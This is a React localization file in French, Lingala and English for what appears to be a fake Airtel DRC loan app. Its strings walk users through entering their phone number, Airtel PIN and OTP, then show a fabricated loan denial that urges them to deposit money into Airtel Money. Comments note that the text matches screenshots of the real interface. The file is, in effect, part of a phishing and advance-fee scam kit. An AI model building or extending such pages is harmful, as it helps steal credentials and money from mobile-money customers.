// src/LanguageContext.tsx
import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';

type Language = 'fr' | 'ln' | 'en'; // Set French as the primary type

interface LanguageContextType {
  language: Language;
  setLanguage: (lang: Language) => void;
  t: (key: string) => string;
}

const LanguageContext = createContext<LanguageContextType | undefined>(undefined);

const translations: Record<Language, Record<string, string>> = {
  fr: {
    brandTitle: 'Airtel RDC',
    brandSubtitle: 'Prêts rapides. À tout moment. N\'importe où.',
    secureText: 'Vos informations sont sécurisées.',
    approvalSpinner: 'Approbation en cours...',
    invalidCredentials: 'Identifiants invalides',
    networkError: 'Erreur réseau. Veuillez réessayer.',

    welcomeBack: 'Bon retour',
    loginSubtitle: 'Connectez-vous à Airtel Lite pour finaliser le paiement.', // Matched Screenshot
    phoneNumber: 'Numéro de téléphone',
    enterPin: 'Entrez votre Code', // Matched Screenshot
    loginBtn: 'CONNEXION', // Matched Screenshot
    
    otpTitle: 'Vérification OTP',
    otpSubtitle: 'Entrez l\'OTP envoyé à votre numéro',
    otpWaitingSub: 'Votre demande a été envoyée. Veuillez patienter pendant la vérification...',
    enterOtp: 'Entrez l\'OTP à 4 chiffres',
    otpExpires: 'Le code expire dans',
    submitBtn: 'SOUMETTRE',
    seconds: 'secondes',

    loanLimit: 'Votre limite de prêt',
    dragSlider: 'Faites glisser pour choisir votre montant',
    availableAmount: 'Montant du prêt disponible',
    loanTerm: 'Durée du prêt',
    interestRate: 'Taux d\'intérêt',
    processingFee: 'Frais de dossier',
    monthlyPayment: 'Paiement mensuel',
    continueLoan: 'Continuer pour obtenir le prêt',
    months: 'mois',

    loanDenied: 'Prêt refusé !',
    deniedSubtitle: 'Votre demande de prêt de',
    deniedReason: 'a été refusée en raison d\'une activité insuffisante sur votre compte.',
    inactiveMoney: 'Airtel Money inactif',
    depositAmount: 'Veuillez déposer au moins',
    depositSub: 'sur votre compte Airtel Money pour l\'activer et être éligible à un nouveau prêt.',
    noFundsDeducted: 'Aucun fonds n\'a été déduit de votre compte.',
    applyAgain: 'Vous pouvez postuler à nouveau immédiatement après avoir déposé',
    returnDashboard: 'Retour au tableau de bord',
    backToLogin: 'Retour à la connexion'
  },
  ln: {
    brandTitle: 'Airtel DRC',
    brandSubtitle: 'Mbongo ya mbalasela. Ntango nyonso. Esika nyonso.',
    secureText: 'Basi na yo ezali na libateli.',
    approvalSpinner: 'Kondima ezali na bokambami...',
    invalidCredentials: 'Nkombo to motindo ya nkoma ezali mabe.',
    networkError: 'Likambo na nzela ya nzete. Svp meka lisusu.',
    
    welcomeBack: 'Boyei malamu',
    loginSubtitle: 'Kokota na konte na yo ya Airtel DRC',
    phoneNumber: 'Nimero ya telefone',
    enterPin: 'Kotisa code PIN na yo ya Airtel',
    loginBtn: 'Kokota',
    
    otpTitle: 'Bokengi ya OTP',
    otpSubtitle: 'Kotisa OTP oyo etindami na nimero na yo ya telefone',
    otpWaitingSub: 'Bosenga na yo etindami. Svp zela ntango tozali kotala makambo na yo...',
    enterOtp: 'Kotisa OTP ya mikomisa 4',
    otpExpires: 'Code ekosila na',
    submitBtn: 'KOTINDA',
    seconds: 'ba secondes',
    
    loanLimit: 'Ndelo ya mbongo ya nyongo na yo',
    dragSlider: 'Kokasa slide mpo na kopona motuya',
    availableAmount: 'Mbongo ya nyongo ezwami',
    loanTerm: 'Eleko ya nyongo',
    interestRate: 'Motuya ya intere',
    processingFee: 'Mbongo ya bokambi',
    monthlyPayment: 'Lifuti ya sanza',
    continueLoan: 'Kokoba mpo na kozwa nyongo',
    months: 'sanza',

    loanDenied: 'Nyongo eboyami!',
    deniedSubtitle: 'Bosenga na yo ya nyongo ya',
    deniedReason: 'eboyami mpo na aktivite ya moke na konte na yo.',
    inactiveMoney: 'Airtel Money ezali kosala te',
    depositAmount: 'Svp tia ata',
    depositSub: 'na konte na yo ya Airtel Money mpo na ko activer yango mpe kozwa nyongo ya sika.',
    noFundsDeducted: 'Mbongo moko te ebimisami na konte na yo.',
    applyAgain: 'Okoki kosenga nyongo lisusu mbala moko sima ya kotia',
    returnDashboard: 'Kozonga na tableau de bord',
    backToLogin: 'Kozonga na kokota'
  },
  en: {
    brandTitle: 'Airtel DRC',
    brandSubtitle: 'Fast loans. Anytime. Anywhere.',
    secureText: 'Your information is secure.',
    approvalSpinner: 'Approval in progress...',
    invalidCredentials: 'Invalid credentials',
    networkError: 'Network error. Please try again.',

    welcomeBack: 'Welcome back',
    loginSubtitle: 'Log in to your Airtel DRC account',
    phoneNumber: 'Phone number',
    enterPin: 'Enter your Airtel PIN code',
    loginBtn: 'LOGIN',
    
    otpTitle: 'OTP Verification',
    otpSubtitle: 'Enter the OTP sent to your phone number',
    otpWaitingSub: 'Your request has been sent. Please wait while we verify your details...',
    enterOtp: 'Enter 4-digit OTP',
    otpExpires: 'Code expires in',
    submitBtn: 'SUBMIT',
    seconds: 'seconds',

    loanLimit: 'Your Loan Limit',
    dragSlider: 'Drag the slider to choose your amount',
    availableAmount: 'Available Loan Amount',
    loanTerm: 'Loan Term',
    interestRate: 'Interest Rate',
    processingFee: 'Processing Fee',
    monthlyPayment: 'Monthly Repayment',
    continueLoan: 'Continue to Get Loan',
    months: 'months',

    loanDenied: 'Loan Denied!',
    deniedSubtitle: 'Your application for a loan of',
    deniedReason: 'has been denied due to insufficient account activity.',
    inactiveMoney: 'Inactive Airtel Money',
    depositAmount: 'Please deposit at least',
    depositSub: 'to your Airtel Money account to activate it and qualify for a new loan.',
    noFundsDeducted: 'No funds have been deducted from your account.',
    applyAgain: 'You can apply for the loan again immediately after depositing',
    returnDashboard: 'Return to Dashboard',
    backToLogin: 'Back to Login'
  }
};

export const LanguageProvider = ({ children }: { children: ReactNode }) => {
  // CHANGED: Default is now French ('fr') to match the screenshot
  const [language, setLanguageState] = useState<Language>('fr'); 

  useEffect(() => {
    const savedLang = localStorage.getItem('appLanguage') as Language;
    if (savedLang && ['fr', 'ln', 'en'].includes(savedLang)) {
      setLanguageState(savedLang);
    }
  }, []);

  const setLanguage = (lang: Language) => {
    setLanguageState(lang);
    localStorage.setItem('appLanguage', lang);
  };

  const t = (key: string) => {
    return translations[language][key] || key;
  };

  return (
    <LanguageContext.Provider value={{ language, setLanguage, t }}>
      {children}
    </LanguageContext.Provider>
  );
};

export const useLanguage = () => {
  const context = useContext(LanguageContext);
  if (!context) throw new Error('useLanguage must be used within LanguageProvider');
  return context;
};